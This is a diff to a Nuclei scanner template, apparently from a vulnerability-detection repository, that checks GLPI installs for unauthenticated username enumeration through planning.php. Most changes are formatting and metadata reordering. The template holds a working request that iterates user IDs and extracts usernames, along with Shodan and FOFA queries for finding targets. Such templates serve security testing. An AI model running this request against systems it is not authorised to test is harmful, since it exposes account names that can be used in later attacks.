@@ -1,4 +1,5 @@
 id: glpi-planning-user-enum
+
 info:
   name: GLPI Planning - Unauthenticated Username Enumeration
   author: wong-hau-pepelu
@@ -16,20 +17,22 @@ info:
   classification:
     cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
     cvss-score: 5.3
-    cwe-id: CWE-306,CWE-862
+    cwe-id: CWE-862,CWE-306
   metadata:
-    fofa-query: app="GLPI"
+    verified: true
     max-request: 5
+    vendor: glpi-project
     product: glpi
     shodan-query: http.title:"Authentication - GLPI"
-    vendor: glpi-project
-    verified: true
-  tags: enum,glpi,planning,unauth,vuln
+    fofa-query: app="GLPI"
+  tags: glpi,planning,enum,unauth,vuln
+
 http:
   - raw:
       - |
         GET /front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02 HTTP/1.1
         Host: {{Hostname}}
+
     payloads:
       uid:
         - "2"
@@ -37,18 +40,21 @@ http:
         - "4"
         - "5"
         - "6"
+
     attack: batteringram
     stop-at-first-match: true
+
     matchers:
       - type: dsl
         dsl:
           - 'contains(body, "fs-4")'
           - 'status_code == 200'
         condition: and
+
     extractors:
       - type: regex
         part: body
         group: 1
         regex:
           - '<th class="fs-4"[^>]*>([^<]+)</th>'
-        # digest: 4b0a00483046022100f290c6822728138a676cca1832633a4f7cd572df7cfffc728b21b470093e0426022100a92a2a10dad0b8d6e16565ec2bf9f3e3641e55cd5a728f78894fc21135619c0c:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f290c6822728138a676cca1832633a4f7cd572df7cfffc728b21b470093e0426022100a92a2a10dad0b8d6e16565ec2bf9f3e3641e55cd5a728f78894fc21135619c0c:922c64590222798bb761d5b6d8e72950
